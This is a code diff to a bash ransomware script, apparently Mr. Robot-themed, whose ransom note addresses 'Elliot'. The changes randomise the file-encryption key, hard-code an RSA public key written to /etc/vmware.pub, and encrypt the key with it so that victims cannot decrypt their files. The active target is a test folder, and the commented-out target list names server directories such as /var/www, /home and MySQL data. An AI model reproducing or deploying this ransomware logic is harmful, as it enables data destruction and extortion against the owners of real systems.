@@ -57,7 +57,10 @@ exit
 init() {
 	check_req
 	check_msg
-	KEY="PASSWORD"
+	KEY="$RANDOM""RanPaul$RANDOM"
+	pubkey="-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4euqwCPkVQYx/hsukQeq\nFTpnda31RI3TNTL8T4ZiU63LYncuKwqIO6Uj9h398U7NCG4TUbBgO9JkcPB10x++\nEvrjxAMMLLCVd+Kxo2CTy/wuk2sIycZjH4PTc5yQYV9hRHkaVs311VjkQHeUcC6x\nPFm5obeTpIUKC8t8FFZ2NiTS6ZMxQmUEhEbabP4VvsilqY/LaX1KzoskRHarZywy\nHfPVKfzffKR2DJ8BmUvh8BXOW/hsrLfUMfXnLfHxQLAo27H3IM457X23wqgDWdMp\npIetu54guYDbCPQNv8ERI8LX3v0n+XLdLqKFpcvramB7pLf6aX2m2VC4ozrv/Yju\njQIDAQAB\n-----END PUBLIC KEY-----"
+	echo "$pubkey" > /etc/vmware.pub
+	dec
 }
 navdir() {
 for fil in $1; do
@@ -128,8 +131,8 @@ enc_loop() {
 }
 ################## DECRYPT ################################
 dec() {
-	PRIVATEKEY="private.key"
-	echo "$KEY" > $PRIVATEKEY
+	PRIVATEKEY="/etc/vmware.key"
+	echo "$KEY" | openssl rsautl -encrypt -pubin -inkey "/etc/vmware.pub" -out $PRIVATEKEY
 }
 upk() {
 	if [ "$SOFT" = "" ]; then
@@ -141,7 +144,6 @@ upk() {
 	fi
 }
 dec_loop() {
-	dec
 	kills="$1"
 	for i in $kills; do
 		if [ -d "$i" ]; then
@@ -181,7 +183,8 @@ main() {
 	trap '' TERM
 	SOFT="YES"
 	init
-	targets="/var/spool /var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
+	targets="/root/Desktop/testing"
+	#targets="/var/spool /var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
 	enc_loop "$targets"
 	message="Congratulations Elliot,\n\nYou have been infected with a RANSOMWARE!!!!!\nI know. Scary stuff.\nAnyways, Im giving you a choice. You can either encrypt some important files, or lose access to your box and keep the files. Your choice kid.\n\nLove, Mr. Robot\n\n\nKeep the files?"
 	title="Oops.."
